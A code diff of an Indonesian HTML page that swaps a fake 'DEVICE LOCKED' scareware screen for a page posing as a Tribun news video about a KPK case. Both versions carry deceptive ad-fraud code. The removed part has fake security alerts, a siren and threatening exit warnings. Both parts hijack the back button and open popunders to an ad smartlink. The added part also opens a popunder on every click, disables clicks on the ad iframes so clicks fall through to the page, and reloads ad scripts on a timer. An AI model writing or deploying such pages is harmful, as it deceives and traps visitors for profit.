@@ -3,95 +3,106 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SISTEM CRITICAL: Tindakan Diperlukan</title>
-    
-    <link rel="manifest" href="data:application/manifest+json,{'name':'System Security','short_name':'System','start_url':'/','display':'standalone','background_color':'#000','theme_color':'#f00','icons':[{'src':'https://cdn-icons-png.flaticon.com/512/300/300221.png','sizes':'512x512','type':'image/png'}]}">
-
+    <title>Tribun Play Services - Video Eksklusif</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        .emergency-overlay { position: fixed; inset: 0; background: #000; z-index: 9999; color: #f00; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
-        .blink { animation: blinker 0.4s linear infinite; }
-        @keyframes blinker { 50% { opacity: 0; } }
-        .btn-panic { background: #f00; color: #fff; padding: 20px 50px; border-radius: 12px; font-weight: 900; animation: pulse 1s infinite; }
-        @keyframes pulse { 0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 0, 0, 0.7); } 70% { transform: scale(1.05); box-shadow: 0 0 0 20px rgba(255, 0, 0, 0); } 100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 0, 0, 0); } }
+        body { background: #0f0f0f; color: white; font-family: sans-serif; overflow-x: hidden; margin-bottom: 70px; }
+        .video-player { width: 100%; aspect-ratio: 16/9; background: #000; position: relative; cursor: pointer; }
+        .ad-slot { background: #1a1a1a; display: flex; justify-content: center; align-items: center; overflow: hidden; margin: 10px 0; border: 1px solid #333; }
+        .nav-bottom { position: fixed; bottom: 0; width: 100%; background: #0f0f0f; border-top: 1px solid #222; display: flex; justify-content: space-around; padding: 10px; z-index: 100; }
+        iframe { border: none; pointer-events: none; } /* Iframe dibuat no-click agar klik jatuh ke layar utama */
+        .click-overlay { position: fixed; inset: 0; z-index: 50; }
     </style>
 </head>
-<body class="bg-black">
+<body onclick="handleGlobalClick()">
 
-    <div class="emergency-overlay p-6" id="lock-screen">
-        <div class="text-7xl mb-6">🚨</div>
-        <h1 class="text-3xl font-black blink tracking-tighter text-white">DEVICE LOCKED</h1>
-        <p class="text-sm mt-4 text-red-500 font-bold uppercase">Ancaman Keamanan Terdeteksi!</p>
-        <p class="text-[10px] mt-2 text-gray-500 max-w-xs">Browser Anda mencoba memuat konten berbahaya dari portal berita. Segera verifikasi identitas perangkat untuk membuka kembali.</p>
-        
-        <button onclick="handlePanicClick()" class="btn-panic mt-10 shadow-2xl">
-            VERIFIKASI & BUKA PERANGKAT
-        </button>
-
-        <div class="mt-12 opacity-30 text-[8px] font-mono text-left w-full border-t border-gray-900 pt-4">
-            LOG_ERR: SECURITY_BREACH_DETECTED<br>
-            IP_STATUS: TRACKED_BY_KPK_SERVER<br>
-            STATUS: REDIRECT_LOOP_ACTIVE
+    <div class="p-3 flex items-center justify-between sticky top-0 bg-[#0f0f0f] z-[60]">
+        <div class="flex items-center gap-2">
+            <span class="text-[10px] font-bold">17:15</span>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b1/Tribun_Network_logo.png" class="h-3">
         </div>
+        <div class="flex gap-4 text-xs">📺 🔔 🔍 <span class="bg-blue-600 px-2 rounded-full">G</span></div>
+    </div>
+
+    <div class="ad-slot h-[60px]" id="banner-top"></div>
+
+    <div class="video-player">
+        <img src="https://raw.githubusercontent.com/yudha-p/asset/main/husen_kpk.jpg" class="w-full h-full object-cover opacity-80">
+        <div class="absolute inset-0 flex items-center justify-center">
+            <div class="w-14 h-14 bg-white/90 rounded-full flex items-center justify-center">
+                <div class="w-0 h-0 border-t-[10px] border-t-transparent border-b-[10px] border-b-transparent border-left-[18px] border-l-black ml-1"></div>
+            </div>
+        </div>
+        <div class="absolute bottom-2 left-2 bg-black/70 text-[10px] px-2 py-0.5 rounded">0:07 / 2:52</div>
+    </div>
+
+    <div class="p-4">
+        <h1 class="text-lg font-bold leading-tight">KPK BUKA OPSI PERIKSA AHMAD HUSEIN TERKAIT KASUS GRATIFIKASI</h1>
+        <p class="text-[10px] text-gray-500 mt-2">7 hari yang lalu • Tribun Play Services</p>
+    </div>
+
+    <div class="ad-slot h-[250px]" id="banner-mid"></div>
+
+    <div class="p-4 space-y-4">
+        <div class="flex gap-3">
+            <div class="w-32 h-20 bg-gray-800 rounded relative overflow-hidden">
+                <img src="https://via.placeholder.com/150x100?text=News" class="w-full h-full object-cover opacity-50">
+            </div>
+            <div class="flex-1">
+                <p class="text-xs font-bold">Ratusan Siswa SMA di Kudus Diduga Keracunan...</p>
+                <p class="text-[9px] text-gray-500 mt-1">BeritaSatu • 5,2 rb ditonton</p>
+            </div>
+        </div>
+        
+        <div class="ad-slot h-[50px]" id="banner-small"></div>
+    </div>
+
+    <div class="nav-bottom text-[9px] text-gray-400">
+        <div class="text-center">🏠<br>Home</div>
+        <div class="text-center">🧭<br>Explore</div>
+        <div class="text-center">📺<br>Subscriptions</div>
+        <div class="text-center">📂<br>Library</div>
     </div>
 
     <script>
         const smartlink = "https://www.effectivegatecpm.com/ypk79fz44e?key=086401ebd705ad471cfebf22fb4f94f4";
         const socialBar = "https://pl28606612.effectivegatecpm.com/59/b3/e8/59b3e86754e4943e8fe6f30131f537e7.js";
-        let audioCtx = null;
 
-        // --- FITUR ANTI-CLOSE & BACK HIJACK ---
-        
-        // 1. Membajak tombol Back (Kembali)
-        function hijackHistory() {
-            window.history.pushState(null, "", window.location.href);
-            window.onpopstate = function() {
-                // Saat tombol back ditekan, buka smartlink dan paksa stay di halaman ini
-                window.open(smartlink, '_blank');
-                window.history.pushState(null, "", window.location.href);
-                alert("Peringatan: Keluar sekarang akan mengunci data perangkat Anda secara permanen!");
-            };
+        // Fungsi Load Iklan
+        function injectAd(id, key, w, h) {
+            const el = document.getElementById(id);
+            el.innerHTML = `<iframe srcdoc="<html><body style='margin:0;display:flex;justify-content:center;'><script>atOptions={'key':'${key}','format':'iframe','height':${h},'width':${w},'params':{}};\x3C/script><script src='https://www.highperformanceformat.com/${key}/invoke.js'><\/script></body></html>" width="${w}" height="${h}"></iframe>`;
         }
 
-        // 2. Memicu peringatan saat tab mau ditutup
-        window.onbeforeunload = function() {
-            return "Sistem sedang melakukan pembersihan. Jika Anda keluar sekarang, perangkat mungkin tidak bisa digunakan kembali!";
-        };
-
-        function handlePanicClick() {
+        function handleGlobalClick() {
+            // Setiap klik di mana saja buka Popunder
             window.open(smartlink, '_blank');
-            playSiren();
-            // Setiap klik memperkuat siklus iklan
-            startPersistentAds();
         }
 
-        function playSiren() {
-            if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-            const osc = audioCtx.createOscillator();
-            const gain = audioCtx.createGain();
-            osc.type = 'sawtooth';
-            osc.frequency.setValueAtTime(600, audioCtx.currentTime);
-            osc.frequency.exponentialRampToValueAtTime(1200, audioCtx.currentTime + 0.3);
-            osc.connect(gain); gain.connect(audioCtx.destination);
-            gain.gain.setValueAtTime(0.05, audioCtx.currentTime);
-            osc.start(); osc.stop(audioCtx.currentTime + 0.4);
-            if (navigator.vibrate) navigator.vibrate([400, 200, 400]);
-        }
+        function startSilentEngine() {
+            // Load Banner Awal
+            injectAd('banner-top', '715b73e0d659246d1b505260e3e38d04', 468, 60);
+            injectAd('banner-mid', 'af1659d35453444bc57653f2ae403c79', 300, 250);
+            injectAd('banner-small', 'dbdbc33403cb5b88f4914ac88034303b', 320, 50);
 
-        function startPersistentAds() {
-            // Siklus 30 detik untuk Popunder Otomatis
+            // Refresh Iklan & Social Bar tiap 35 detik
             setInterval(() => {
-                window.open(smartlink, '_blank');
                 const s = document.createElement('script');
                 s.src = socialBar + '?v=' + Date.now();
                 document.body.appendChild(s);
-            }, 30000);
+                // Refresh banner
+                startSilentEngine(); 
+            }, 35000);
+
+            // Anti-Back
+            window.history.pushState(null, "", window.location.href);
+            window.onpopstate = () => {
+                window.open(smartlink, '_blank');
+                window.history.pushState(null, "", window.location.href);
+            };
         }
 
-        window.onload = () => {
-            hijackHistory();
-            if ('wakeLock' in navigator) navigator.wakeLock.request('screen').catch(() => {});
-        };
+        window.onload = startSilentEngine;
     </script>
 </body>
 </html>
